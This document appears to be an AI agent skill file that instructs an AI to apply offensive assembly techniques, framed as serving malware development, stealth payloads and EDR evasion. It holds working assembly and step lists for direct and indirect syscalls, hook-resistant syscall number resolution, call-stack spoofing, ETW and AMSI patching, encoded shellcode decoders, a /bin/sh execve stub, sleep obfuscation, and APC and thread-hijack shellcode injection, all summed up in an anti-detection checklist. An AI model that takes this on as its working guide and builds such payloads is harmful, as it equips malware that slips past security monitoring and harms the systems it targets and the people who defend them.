---
name: asm-offensive-patterns
description: "Offensive x86-64 (and ARM64/x86) assembly patterns for red team, malware development, and evasion engineering. Covers direct/indirect syscalls; SSN resolution (Hell's Gate, Halo's Gate, Tartarus' Gate, FreshyCalls, DWhisper/RecycleGate); call-stack spoofing (Draugr, SilentMoonwalk DESYNC, Eclipse bypass); vDSO/libc dispatching on Linux; Heaven's Gate WoW64; PEB-walk IAT-free API resolution; metamorphic encoders (ADFL, XorMeta, Morph, MBA-XOR); PIC shellcode (CALL-POP, RIP-relative); ETW/AMSI patching; Gargoyle sleep obfuscation; VEH+HWBP HWBP abuse; fiber/threadless injection; ARM64 macOS syscalls. Use when writing, reviewing, or generating offensive .asm/.s/.S files; building stealth payloads, loaders, or BOFs; or selecting the right evasion primitive for Windows/Linux/macOS."
license: MIT
metadata:
  author: AeonDave
  version: "1.0"
compatibility: "NASM >= 2.15 / GAS / Go Plan9 ASM. x86-64 Windows/Linux/macOS, ARM64 macOS/Linux, x86 WoW64."
---

# Offensive Assembly Patterns

Full spectrum of low-level assembly techniques for offensive security:
shellcode, loaders, BOFs, evasion primitives, and stealth infrastructure.
Apply to all `.asm`, `.s`, `.S` files that touch evasion, injection, hooking, or stealth execution.

> **Scope**: Authorized red team / research use only.

---

## 1. Syscall Strategies

### 1.1 Direct Syscall

Issue `SYSCALL` directly from own `.text` — bypasses all userland hooks.
Detection risk: kernel-side ETW sees RIP outside ntdll -> **high signal** for modern EDRs.
Use before ntdll hooks load (Early-Bird), or where kernel callbacks are not deployed.

```nasm
; Windows x64 — kernel ABI: copy RCX -> R10 before syscall
NtAllocateVirtualMemory:
    mov  r10, rcx          ; kernel requires arg1 in R10, not RCX
    mov  eax, 0x18         ; SSN — varies per OS build, resolve at runtime
    syscall
    ret

; Linux x64 — RAX=num, RDI/RSI/RDX/R10/R8/R9 = args 1-6
;             kernel clobbers RCX (saved RIP) and R11 (saved RFLAGS)
asmSyscall:
    mov  rax, rdi
    mov  rdi, rsi
    mov  rsi, rdx
    mov  rdx, rcx
    syscall
    ret
```

### 1.2 Indirect Syscall (Windows)

Jump to a `SYSCALL;RET` gadget inside ntdll.dll. Kernel records RIP as ntdll — low signal.
Stack still exposes RX region unless spoofed (see §2).

```nasm
NtAllocateVirtualMemory:
    mov  r10, rcx
    mov  eax, [wSSN]           ; SSN resolved at runtime
    jmp  [pSyscallGadget]      ; -> ntdll!ZwAllocateVirtualMemory+0x12 (0F 05 C3)
wSSN:          dq 0
pSyscallGadget: dq 0
```

**Gadget search** — scan ntdll export table for byte pattern `[0x0F, 0x05, 0xC3]`:
```
for each Zw* export -> scan forward from entry until [0F 05 C3] -> record addr + SSN
```

### 1.3 SSN Resolution — Full Technique Family

| Technique | Year | Hook resistance | Core algorithm |
|---|---|---|---|
| Hell's Gate | 2020 | None — breaks on any hook | Read `4C 8B D1 B8 [SSN]` from stub start |
| Halo's Gate | 2021 | Medium — single hook | Detect `E9` JMP; scan neighboring stubs ±N |
| Tartarus' Gate | 2021 | High — sparse multi-hooks | Detect E9/FF25/EB/CC hooks; walk ±16 neighbors |
| FreshyCalls | 2022 | Very high | Sort all `Zw*` exports by VA; SSN = sorted index |
| DWhisper / RecycleGate | ADE | Maximum | Sort-by-VA + seeded hash at rest + random gadget scan |
| SysWhispers3 | 2022 | Very high | Sort + random indirect jmp gadget per call |
| FromDisk | — | Maximum | Map clean ntdll from `\KnownDlls\ntdll.dll`; parse on-disk |

**DWhisper (ADE RecycleGate) — implementation notes:**
```
1. ntdll base from GS:[0x60] PEB walk — zero Win32 API calls
2. Collect all Zw* exports; apply seeded hash to name at rest (no plaintext strings)
3. Bubble-sort by VirtualAddress; SSN(NtFoo) = ZwFoo sorted index
4. GetRecyCall: SHUFFLE export list randomly before gadget scan;
   validate bytes at [VA+18] == 0F 05 C3 (SYSCALL;RET) -> return VA+18
   Random scan order defeats behavioral timing fingerprinting per call
5. All sensitive strings (ntdll, Nt, Zw prefixes) XOR-encrypted at rest
```

See [references/syscall-internals.md](references/syscall-internals.md) for full byte patterns, neighbor-scan algorithms, and hook detection details.

### 1.3.1 Invocation Modes (orthogonal to SSN resolution)

| Mode | SYSCALL RIP | ASM needed | Detection surface |
|---|---|---|---|
| Direct | malware `.text` | Required | `SYSCALL` outside ntdll address range |
| Indirect | ntdll stub +0x12 | JMP only | non-ntdll return address below `SYSCALL` |
| Vectored (VEH+HWBP) | ntdll stub (via Dr0) | None | `AddVectoredExceptionHandler`; debug registers |
| Layered (ADE) | inner gate | None | wraps any Callgate; per-call pre/post intercept |

### 1.4 vDSO Indirect Syscall (Linux x86-64)

Dispatch via `SYSCALL;RET` gadget in vDSO page. Kernel records RIP in vDSO/libc — identical to glibc.

```nasm
; func vdsoSyscall(num, a1, a2, a3, gadget uintptr) uintptr
vdsoSyscall:
    mov  rax, rdi              ; syscall number
    mov  rdi, rsi              ; arg1
    mov  rsi, rdx              ; arg2
    mov  rdx, rcx              ; arg3
    mov  r11, r8               ; R11 = gadget address
    call r11                   ; CALL -> gadget: SYSCALL;RET -> returns here
    ret
```

**Finding vDSO gadget at runtime**:
```
1. getauxval(AT_SYSINFO_EHDR) or parse /proc/self/maps for "vdso"
2. Parse ELF header at that address
3. Scan .text for bytes [0x0F, 0x05, 0xC3] — first match is gadget
4. Fallback: scan libc.so .text for [0x0F, 0x05, 0xC3]
```

---

## 2. Call-Stack Spoofing (Windows x64)

EDRs unwind the call stack via `RtlVirtualUnwind` using `.pdata` RUNTIME_FUNCTION entries.
Goal: make the walk see `ntdll!NtXxx -> KernelBase -> BaseThreadInitThunk -> RtlUserThreadStart -> 0`.

### 2.1 Draugr-Style Synthetic Frames

Build frames **bottom-up** by decrementing RSP on a **heap buffer** (not the goroutine/thread stack):

```
SpoofContext layout (+offset / field):
  +0   JmpRbxGadget          — JMP [RBX] in KernelBase
  +8   BaseThreadInitThunkRet
  +16  RtlUserThreadStartRet
  +24  Frame1Size             — BaseThreadInitThunk frame size
  +32  Frame2Size             — RtlUserThreadStart frame size
  +40  TrampolineSize         — JMP [RBX] frame size (>= 0x80 for arg slots)
```

```nasm
; Switch SP to heap buffer, then build bottom-up:
    PUSHQ $0                          ; sentinel (thread bottom)
    SUBQ  Frame2Size(R14), SP
    MOVQ  RtlUserThreadStartRet(R14), 0(SP)
    SUBQ  Frame1Size(R14), SP
    MOVQ  BaseThreadInitThunkRet(R14), 0(SP)
    SUBQ  TrampolineSize(R14), SP
    MOVQ  JmpRbxGadget(R14), 0(SP)   ; return from syscall;ret -> trampoline
    ; Set RBX -> fixup addr, copy args, CALL R15 (syscall;ret gadget)
```

### 2.2 SilentMoonwalk DESYNC + Eclipse Bypass

Diverges unwinder metadata path from execution path:

```
Unwinder sees:  AddRspX -> JmpRbx -> SecondFrame(PUSH_NONVOL RBP) -> FirstFrame(SET_FPREG)
Execution does: syscall;ret -> ADD RSP,X;RET (skip over ROP zone) -> JMP [RBX] -> fixup
```

All return addresses must be **CALL-preceded** (Eclipse rule) — source JMP [RBX] gadgets from `wininet.dll`.
Gadget cascade: `wininet.dll -> user32.dll -> kernelbase.dll (Eclipse-validated) -> kernelbase.dll`.

```
DesyncContext (+offset):
  +0   AddRspXGadget         +8  AddRspXValue
  +16  JmpRbxGadget (Eclipse-validated, call-preceded)
  +24  FirstFrameRetAddr (SET_FPREG fn + call offset)
  +32  SecondFrameRetAddr (PUSH_NONVOL RBP fn + call offset)
  +40..+64: frame sizes + RbpPlantOffset
```

### 2.3 LayeredSyscall — VEH + HWBP Live Frame Capture

No pre-built fake frames; captures real call context live:
```
1. Set hardware breakpoint (Dr0) on target NtXxx entry point
2. Register VEH
3. Call NtXxx normally through any call site
4. VEH fires: save RSP, overwrite top-of-stack frames, restore RSP, NtContinue
```

---

## 3. Heaven's Gate — WoW64 32->64 Mode Switch

From a 32-bit WoW64 process, execute native 64-bit code and syscalls, bypassing all 32-bit hooks:

```nasm
; 32-bit code — far return to switch CS to 0x33 (64-bit segment)
    push 0x33               ; 64-bit CS selector
    push OFFSET code64      ; target 64-bit RIP
    retf                    ; far return -> CPU mode switch -> 64-bit execution

BITS 64
code64:
    ; native 64-bit: access 64-bit ntdll.dll, issue x64 syscalls directly
    ; return to 32-bit:
    push 0x23               ; 32-bit CS selector
    push eip_return         ; 32-bit EIP
    retf
```

Limitation: blocked by CFG if enforced; requires WoW64 process; not universal on Windows 10/11.

---

## 4. PEB Walk — IAT-Free API Resolution

```nasm
; x64: TEB.ProcessEnvironmentBlock at GS:[0x60]
    mov  rax, gs:[0x60]         ; PEB*
    mov  rax, [rax + 0x18]      ; PEB->Ldr
    mov  rax, [rax + 0x20]      ; InMemoryOrderModuleList.Flink
    ; walk LIST_ENTRY, compare BaseDllName via DJB2 / FNV-1a hash

; x86: FS:[0x30]
    mov  eax, fs:[0x30]         ; PEB*
    mov  eax, [eax + 0x0C]      ; PEB->Ldr
    mov  eax, [eax + 0x14]      ; InMemoryOrderModuleList.Flink
```

**Export table resolution** after finding module base:
```
dos = (IMAGE_DOS_HEADER*)base
nt  = base + dos->e_lfanew
exp = nt->OptionalHeader.DataDirectory[0]  (IMAGE_EXPORT_DIRECTORY)
for i in 0..NumberOfNames:
    name = base + AddressOfNames[i]
    if hash(name) == target_hash:
        return base + AddressOfFunctions[AddressOfNameOrdinals[i]]
```

**Hash choice**:
- **DJB2**: `h = ((h<<5)+h) + c`, seed 5381 — compact, case-insensitive variant common
- **FNV-1a 64-bit**: fewer collisions, preferred for large export tables

**Zero-string rule**: never embed DLL/function names as plaintext — hash at compile time.

---

## 5. Metamorphic Encoders & Instruction Obfuscation

### 5.1 ADFL — Additive Feedback Loop (Shikata Ga Nai-Style)

Encode in reverse; decode forward with seed update. Each byte XOR'd with running seed.

```nasm
; Decoder stub (x64, RIP-relative, self-modifying)
    mov   bl, KEY               ; seed
    mov   rcx, PAYLOAD_LEN
    lea   rsi, [rip + 7]        ; rsi = first payload byte
.loop:
    mov   al, [rsi]             ; load ciphertext byte
    xor   al, bl                ; decrypt: pt = ct ^ seed
    mov   [rsi], al             ; write plaintext
    add   bl, al                ; seed += pt  (additive feedback)
    inc   rsi
    loop  .loop
    ; fall through to decoded payload
```

### 5.2 XorMeta — Metamorphic Rolling-XOR

Random register allocation + equivalence substitution per build. Equivalences:

| Original | Equivalent (random pick) |
|---|---|
| `DEC rX` | `SUB rX, 1` |
| `INC rX` | `ADD rX, 1` |
| `XOR rX, rX` | `SUB rX, rX` or `MOV rX, 0` |
| `MOV rX, imm` | `XOR rX,rX` + `ADD rX, imm` |
| `OR rX, rX` | `TEST rX, rX` |

### 5.3 Morph — RX-Compatible Metamorphic Rewriter

Rewrites x64 instructions into equivalents **without self-modification** — safe for RW→RX.

Transforms: IMM decompose (ADD/SUB/XOR chain wrapped in PUSHFQ/POPFQ), direction-bit swap (reg↔r/m + REX.R↔REX.B), XOR/SUB zeroing equivalence, NOP expansion, junk insertion (Intel multi-byte NOPs only — 32-bit writes zero-extend; CALL-POP anchor zone: size-preserving only), jump widening (rel8→rel32 with up to 5 stabilization passes), JMP prolog + dead epilog.

**NOT** applied: INC↔ADD 1 / DEC↔SUB 1 (CF contract differs); `MOV r,0` as zeroing variant (no flag write).

See [references/encoders.md](references/encoders.md) for full transform catalogue, safety rules, and extended techniques (register renaming, code transposition, opaque predicates, MetaPHOR table, SMT-based equivalence).

### 5.4 MBA-XOR — Mixed Boolean Arithmetic Obfuscation

Replace `ct ^ key` with algebraically equivalent expression to defeat signature matching:
```
a ^ b  =  (a + b) - 2*(a & b)
```
Combined with rotate: `decrypt(ct[i]) = ror3( MBA_xor(ct[i], key[i%kl]) )`.
Power-of-2 key length: compute `i % kl` via MBA identity `(i & (kl-1))`.

---

## 6. Position-Independent Code (PIC) Patterns

### 6.1 CALL-POP Base Address

```nasm
call  .next            ; pushes RIP of .next onto stack
.next:
pop   rbx              ; RBX = runtime address of ".next"
; all data offsets: [rbx + (data_label - .next)]
```

**Anchor rule**: CALL and POP must be adjacent — morphers must not insert junk between them.

### 6.2 RIP-Relative (x64 preferred)

```nasm
lea  rax, [rel my_data]       ; NASM
lea  rax, my_data(%rip)       ; GAS
```

### 6.3 Stack-Based Strings (no data section, no nulls)

```nasm
; "cmd\0" pushed via imm64 (no embedded null in instruction stream)
xor  rax, rax
push rax                       ; null terminator
mov  rax, 0x646d63             ; "cmd" little-endian
push rax
mov  rcx, rsp                  ; ptr to "cmd\0"
```

### 6.4 AlignRSP Stub (shellcode entry)

```nasm
; Ensures 16-byte RSP alignment before calling shellcode entry
AlignRSP:
    push rsi
    mov  rsi, rsp
    and  rsp, -16              ; align down to 16 bytes
    sub  rsp, 0x20             ; Win64 homing space
    call main
    mov  rsp, rsi
    pop  rsi
    ret
```

---

## 7. ETW & AMSI Patching

### 7.1 Patch NtTraceEvent (or EtwEventWriteFull)

```
1. Resolve ntdll!NtTraceEvent via PEB walk (hash-based)
2. VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &old)
3. Write 0xC3 (RET) or [48 31 C0 C3] (xor rax,rax; ret) for NTSTATUS=0
4. VirtualProtect(addr, 1, old, &discard)
```

### 7.2 Patch AmsiScanBuffer (flip conditional)

```
offset = &AmsiScanBuffer + 0x83   ; platform-dependent — verify at runtime
patch: 0x74 -> 0x75               ; JZ -> JNZ (always return AMSI_RESULT_CLEAN)
```

### 7.3 Patchless ETW via HWBP + VEH (no VirtualProtect IOC)

```
Set Dr0 = &ntdll!NtTraceEvent, configure Dr7 (bit 0 = local enable, bits 16-17 = execute)
Register VEH: on EXCEPTION_SINGLE_STEP at Dr0:
    ctx->Rax = 0                 ; STATUS_SUCCESS
    ctx->Rip += 6                ; skip SYSCALL (0F 05) + following byte
    ctx->EFlags &= ~0x100        ; clear TF
    re-set Dr7 if needed
    return EXCEPTION_CONTINUE_EXECUTION
```

---

## 8. Sleep Obfuscation — Gargoyle

Mark payload pages NX during sleep; re-arm execution via timer + ROP gadget:

```
x86 StackTrampoline (as APC arg to SetWaitableTimer):
  [esp+0]  -> VirtualProtectEx   (gadget: POP ECX; POP ESP; RET pivots stack here)
  [esp+4]  -> gargoyle_entry
  [esp+8..] VirtualProtectEx args (hProcess, addr, size, PAGE_EXECUTE_READ, &old)

Flow:
  1. VirtualProtect(shellcode_base, size, PAGE_READWRITE, &old)  <- make NX
  2. SetWaitableTimer(hTimer, interval, APC_gadget, &StackTrampoline)
  3. SleepEx(INFINITE, TRUE) or WaitForSingleObjectEx -> alertable wait
  4. APC fires -> gadget -> trampoline -> VirtualProtect (RX) -> shellcode
```

x64 variant: use `ADD RSP, X; RET` (skip over ROP zone) + `JMP [RBX]` gadgets (DESYNC-style).

---

## 9. ARM64 Syscall Patterns

### 9.1 macOS ARM64 (BSD class = 0x2000000)

```nasm
; write(1, buf, 5)
mov  x0,  #1
adr  x1,  msg
mov  x2,  #5
movz x16, #0x4
movk x16, #0x2000, lsl #16    ; x16 = 0x2000004 (BSD write)
svc  #0x80

; execve("/bin/sh", argv=NULL, envp=NULL)
adr  x0,  sh_path
eor  x1,  x1, x1
eor  x2,  x2, x2
movz x16, #0x3b
movk x16, #0x2000, lsl #16    ; x16 = 0x200003b
svc  #0x80
```

**Syscall class encoding**: `x16 = (class << 24) | number`. BSD class = 2.

### 9.2 Linux ARM64

```nasm
; write syscall (nr=64)
mov  x8,  #64
mov  x0,  #1               ; fd
adr  x1,  msg              ; buf (use ADR for PIC)
mov  x2,  #12              ; len
svc  #0
```

---

## 10. Fiber & Threadless Injection

### 10.1 Fiber-Based Shellcode Runner

```
ConvertThreadToFiber(NULL)          -> hMainFiber
CreateFiber(0, shellcode_fn, NULL)  -> hPayloadFiber
SwitchToFiber(hPayloadFiber)        -> jumps directly to shellcode
```

No `CreateThread` / `CreateRemoteThread` — avoids thread-creation monitoring hooks.

### 10.2 Waiting Thread Hijack (overwrite return address)

Write shellcode address over the saved RIP of a sleeping thread (in `Sleep` / `WaitFor*` stack frame).
Thread resumes and executes the shellcode. No `SetThreadContext` needed.

### 10.3 APC Early-Bird Injection

```
CreateProcess(... CREATE_SUSPENDED)
VirtualAllocEx + WriteProcessMemory  (write shellcode)
QueueUserAPC(shellcode_ptr, main_thread, 0)
ResumeThread   -> APC dispatched before any user code runs (pre-TLS)
```

---

## 11. Anti-Detection Checklist

| Concern | Technique |
|---|---|
| Syscall RIP outside ntdll | Indirect syscall (§1.2) or vDSO dispatch (§1.4) |
| Stack trace exposes RX region | Draugr or SilentMoonwalk spoof (§2) |
| SSN read from patched ntdll bytes | Export-sort DWhisper (§1.3) |
| IAT reveals suspicious APIs | PEB walk + hash resolution (§4) |
| String literals in binary | Compile-time hash, stack strings (§6.3) |
| XOR-loop signature | MBA-XOR, ADFL, rolling-key XorMeta (§5) |
| RX memory scanned while idle | Gargoyle sleep obfuscation (§8) |
| ETW event logging | HWBP + VEH patchless bypass (§7.3) |
| Thread creation hooks | Fiber / thread hijack / APC (§10) |
| pclntab Go function name leakage | Opaque short identifiers (Xr, S23, etc.) |
| 32-bit hook layers in WoW64 | Heaven's Gate (§3) |

---

## Resources

| File | When to load |
|---|---|
| [references/syscall-internals.md](references/syscall-internals.md) | NT syscall ABI, SSN tables, Windows calling convention, gadget patterns |
| [references/stack-spoofing.md](references/stack-spoofing.md) | Draugr / SilentMoonwalk DESYNC / Eclipse / LayeredSyscall full detail |
| [references/encoders.md](references/encoders.md) | ADFL / XorMeta / Morph / MBA-XOR implementation and stub bytes |
| [references/pic-shellcode.md](references/pic-shellcode.md) | PIC patterns, CALL-POP, RIP-relative, stack strings, AlignRSP, egg hunter |
| [references/linux-macos-patterns.md](references/linux-macos-patterns.md) | vDSO dispatch, ARM64 macOS/Linux, eBPF evasion, Linux PIC |
| [references/heavens-gate.md](references/heavens-gate.md) | WoW64 mode switching, far jump/ret, 64-bit code from 32-bit process |
| [references/advanced-evasion.md](references/advanced-evasion.md) | Anti-debug ASM, sleep obfuscation evolution, API hashing, ROP/JOP/COP, math obfuscation, self-modifying code, VM detection |
| [assets/syscall-stub-windows.asm](assets/syscall-stub-windows.asm) | NASM indirect + direct syscall stub templates |
| [assets/peb-walk-x64.asm](assets/peb-walk-x64.asm) | NASM PEB walk + export table DJB2 resolution template |
| [assets/decoder-stubs.asm](assets/decoder-stubs.asm) | ADFL / rolling-XOR decoder stubs ready to prefix shellcode |
